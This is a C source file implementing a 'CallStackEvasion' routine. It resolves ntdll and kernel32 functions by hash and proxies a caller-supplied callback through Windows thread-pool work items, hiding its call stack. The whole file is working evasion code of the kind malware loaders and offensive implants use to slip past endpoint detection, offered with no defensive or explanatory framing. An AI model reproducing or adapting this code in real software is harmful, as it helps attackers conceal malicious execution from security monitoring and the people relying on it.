#include <windows.h>
#include "APIresolve.h"

static int CallStackEvasion(LPVOID pFunctionArgsStruct, PTP_WORK_CALLBACK hidecallstack_entry) {
    int hash_TpAllocWork = 0x35829537;
    uint64_t tpallocwork_ptr = 0x00;
    int hash_TpPostWork = 0xc94fc392;
    uint64_t tppostwork_ptr = 0x00;
    int hash_TpReleaseWork = 0xcb60d48d;
    uint64_t tpreleasework_ptr = 0x00;
    int hash_WaitForSingleObject = 0xeccda1ba;
    uint64_t waitforsingleobject_ptr = 0x00;

    typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, LPVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
    typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
    typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);
    typedef DWORD (WINAPI* WAITFORSINGLEOBJECT)(HANDLE, DWORD);

    tpallocwork_ptr = getFunctionPtr(HASH_ntdll, hash_TpAllocWork);
    if (tpallocwork_ptr == 0x00)
    {
        return 1;
    }

    tppostwork_ptr = getFunctionPtr(HASH_ntdll, hash_TpPostWork);
    if (tppostwork_ptr == 0x00)
    {
        return 1;
    }

    tpreleasework_ptr = getFunctionPtr(HASH_ntdll, hash_TpReleaseWork);
    if (tpreleasework_ptr == 0x00)
    {
        return 1;
    }

    waitforsingleobject_ptr = getFunctionPtr(HASH_kernel32, hash_WaitForSingleObject);
    if (waitforsingleobject_ptr == 0x00)
    {
        return 1;
    }

    PTP_WORK WorkReturn = NULL;
    ((TPALLOCWORK)tpallocwork_ptr)(&WorkReturn, hidecallstack_entry, pFunctionArgsStruct, NULL);
    ((TPPOSTWORK)tppostwork_ptr)(WorkReturn);
    ((TPRELEASEWORK)tpreleasework_ptr)(WorkReturn);
    ((WAITFORSINGLEOBJECT)waitforsingleobject_ptr)((HANDLE)-1, 0x1000);

    return 0;
}